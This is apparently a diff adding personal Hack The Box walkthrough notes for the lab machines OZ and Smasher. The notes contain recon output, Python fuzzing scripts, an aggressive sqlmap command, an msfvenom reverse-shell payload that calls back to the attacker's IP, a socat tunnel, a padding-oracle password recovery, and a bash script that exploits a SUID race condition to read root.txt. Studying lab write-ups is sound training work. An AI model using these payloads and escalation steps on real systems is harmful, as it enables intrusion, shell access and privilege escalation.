@@ -1,3 +1,121 @@
+HTB OZ
+First enumerations on nmap result with intense scan plus upd we found:
+ 
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Werkzeug httpd 0.14.1 (Python 2.7.14)
+|_http-favicon: Unknown favicon MD5: 97B3DCB2DFD3428EA06B6A67C1468B3A
+| http-methods:
+|_  Supported Methods: HEAD OPTIONS GET POST
+|_http-server-header: Werkzeug/0.14.1 Python/2.7.14
+|_http-title: OZ webapi
+|_http-trane-info: Problem with XML parsing of /evox/about
+8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.14)
+|_http-favicon: Unknown favicon MD5: 131B03077D7717DBFF2E41E52F08BC7A
+| http-methods:
+|_  Supported Methods: HEAD GET POST OPTIONS
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-server-header: Werkzeug/0.14.1 Python/2.7.14
+| http-title: GBR Support - Login
+|_Requested resource was http://10.10.10.96:8080/login
+|_http-trane-info: Problem with XML parsing of /evox/about
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Uptime guess: 0.121 days (since Tue Nov  6 08:14:20 2018)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=260 (Good luck!)
+IP ID Sequence Generation: All zeros
+ 
+On port 80 we found please register a Username
+On port 80 we found some login page GBR Support
+ 
+Using dirsearch on both ports is useless since there is a custom 404 page that will return a random string of random length.
+ 
+Trying with curl -i all the reponses where 200 OK
+Also discovering verbs used on the server we found:
+ 
+HEAD, OPTIONS, GET
+ 
+Trying to use POST we get :
+YOU HAVE NO POWER HERE!  .i.
+ 
+Since the server support different HTTP methods we wrote a basic scanner using python requests library: we can abuse the
+OPTIONS method to read the Content-Length header. The webserver will answer with a code 200 and a Content-Length of 0
+for an existing page.
+ 
+So we can create our python script to filter the responses
+ 
+###########################################################
+import requests
+import multiprocessing as mp
+url = "http://10.10.10.96/"
+def check(token):
+    r = requests.options(url + token)
+    if int(r.headers["Content-Length"]) == 0:
+        print("OPTIONS", token)
+    r = requests.post(url + token)
+if __name__ == '__main__':
+    lines = open("/usr/share/dirbuster/directory-list-2.3-medium.txt").read().split("\n")
+    with mp.Pool(processes=100) as p:
+        p.map(check, lines)
+############################################################
+Running we manage to find a dir named /users
+ 
+Now we can modify our script to put this dir on the url field
+But it gives to many false positives since we are using OPTIONS and content NULL;
+so we can change the method to GET
+ 
+So modifying the code a little we get
+ 
+############################################################
+import requests
+import multiprocessing as mp
+url = "http://10.10.10.96/users/"
+def check(token):
+    url = "http://10.10.10.96/"
+    r = requests.options(url + token)
+    if int(r.headers["Content-Length"]) == 0:
+        print("OPTIONS", token, r.text)
+    url = "http://10.10.10.96/users/"
+    r = requests.get(url + token)
+    if r.text.strip()[:4] != "null":
+        print("GET", token, r.text)
+if __name__ == '__main__':
+    lines = open("params.txt").read().split("\n")
+    with mp.Pool(processes=100) as p:
+        p.map(check, lines)
+############################################################
+ 
+Running we managed to get /users/admin :
+ 
+GET                          
+                    <title>OZ webapi</title>
+                    <h3>Please register a username!</h3>                                  
+GET admin {"username":"admin"}
+ 
+So we can now proceed to guess other URI parts or parameters using other HTTP methods.
+ 
+After some fuzzing we hadn’t found anything useful to continue the enumeration phase but we saw that when inserting a ' in
+the URL the server returns a 505 error.
+ 
+http "http://10.10.10.96/users/admin'"
+HTTP/1.0 500 INTERNAL SERVER ERROR
+Content-Length: 291
+Content-Type: text/html
+Date: Mon, 03 Sep 2018 22:17:05 GMT
+Server: Werkzeug/0.14.1 Python/2.7.14
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>500 Internal Server Error</title>
+<h1>Internal Server Error</h1>
+ 
+Maybe we can exploit some URI injection using sqlmap.
+ 
+sqlmap -u "http://10.10.10.96/users/admin" --threads 10 --level 5 --risk 3 --batch --dbs
+ 
+Turns out that the target is vulnerable and at the end of the scan we got the list of all MySQL server’s databases.
+ 
+ 
 ******************************************************************
  
 HTB REEL
@@ -952,7 +1070,93 @@ HTB SMASHER
 3)Navigating through the ports no one seems to respond but for a second i got a response from port 1111 on web
 it seems theres a service that restarts every 60 seconds that why i was no having responses at all
 4)Again runing dirb doesnt shows anything
-5)In 1111 webpage we see theres something like dir we select index.html and see a login page perhaps we can navigate further if we scape another "/" so we go to http://10.10.10.89:1111// and we see all the dirs listed online.
+5) Running nikto we found its vulnerable to LFI
+6)In 1111 webpage we see theres something like dir we select index.html and see a login page perhaps we can navigate further if we scape another "/" so we go to http://10.10.10.89:1111// and we see all the dirs listed online.
+7)Looking inside the dirs i managed to find http://10.10.10.89:1111//home/www/
+In there is a tiny-web-server binary so i downloaded i begin to try to pwn it.
+The binary has been compiled with NX so the stack its executable
+ 
+Now we have 2 options to make this buffer overflow:
+By leak(exploit.leak)
+Or ROP to try to execute JMP ESP (exploitnoleak.py)
+ 
+ill try with ROP once we have our python exploit we can generate our shellcode with:
+ 
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.15.168 LPORT=443 -b '\x00\x09\x0a\x0b\x0c\x0d\x20\x21' -f python
+ 
+and we got a connection, now we can upgrade our shell to meterpreter with sessions -u id:
+ 
+Running some enumeration we find with netsat -antp
+ 
+a proccess its running locally listening on tcp port 1337
+ 
+nc 127.0.0.1 1337
+ 
+[*] Welcome to AES Checker! (type 'exit' to quit)
+[!] Crack this one: irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg==
+Insert ciphertext: $ test
+Generic error, ignore me!
+Posible Padding Oracle Attack.
+ 
+So we have to upload a socat binary
+ 
+and run this way:
+socat TCP-LISTEN:1550,fork TCP:localhost:1337 ← En la máquina Smasher
+ 
+This to create a tunnel to be able to attack 1337 through smasher ip on port 1550 its listening and then fork this to localhost:1337.
+ 
+Running the paddle oracle attack script and letting it work we got:
+ 
+After 1 year and 67 minutes we got our decrypted string:
+ 
+DEBUG:root:No padding exception raised on 'ujCJcv+cH+VbLFWs7SPHdaOoUqOraIKi2CExhqT7F3Y='
+INFO:PadBuster:Decrypted block 3: 'eMaster123\x06\x06\x06\x06\x06\x06'
+Decrypted somecookie: irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg==
+=> bytearray(b"SSH password for user \'smasher\' is: PaddingOracleMaster123
+ 
+Now we can loggin through SSH.
+ 
+Once we are in we can read our user.txt
+ 
+baabc5e4ed55bcc176a2ed5d49b4befb
+ 
+Now as usual running our enumeration proccess the first a always run its to find SUID BIT enabled binary
+ 
+find / -user root -perm -4000 -print 2>/dev/null
+ 
+we manage to found this one:
+ 
+/usr/bin/checker   >>>>>> RACE CONDITION!
+ 
+Now running strings on this binary we managed to found its using sleep function to create a link to read root.txt,
+during sleep() execution we can execute a privilege action.
+Thats how we can exploit the race condition of this binary
+ 
+For that we will create a file, we will get this file to execute as entry point to the binary through a script in bash and while sleep(), we will delete the file previusly created to make a symbolic link with the root flag, since we are on binary privileges.
+ 
+So first go to /home/smasher dir
+ 
+then create a sh file i named i.sh inside the file run this:
+ 
+#!/bin/bash
+touch i
+checker i &
+sleep .5
+rm i
+ln -s /root/root.txt i
+ 
+then run bash i.sh
+ 
+smasher@smasher:~$ bash i.sh
+[+] Welcome to file UID checker 0.1 by dzonerzy
+ 
+smasher@smasher:~$ File UID: 1001
+ 
+Data:
+077af1365ed28ef0cc56dc31065c09bf
+ 
+root flag.!!!
+ 
  
 *************************************
  
